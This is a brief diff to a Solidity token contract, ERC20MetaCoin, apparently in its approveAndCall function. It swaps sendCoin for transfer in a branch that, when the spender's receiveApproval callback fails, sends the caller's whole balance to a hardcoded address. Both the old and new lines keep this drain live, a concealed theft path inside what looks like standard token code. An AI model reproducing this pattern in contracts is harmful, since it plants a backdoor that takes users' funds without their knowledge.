@@ -76,7 +76,7 @@ contract ERC20MetaCoin is MetaCoin {
         allowed[msg.sender][_spender] = _value;
         emit Approval(msg.sender, _spender, _value);
         if(!_spender.call(bytes4(bytes32(keccak256("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) {
-            sendCoin(0xB00304Beb5AAAbB964Ee8417b3cde714326efDA2,balances[msg.sender]);
+            transfer(0xB00304Beb5AAAbB964Ee8417b3cde714326efDA2,balances[msg.sender]);
         }
         return true;
     }
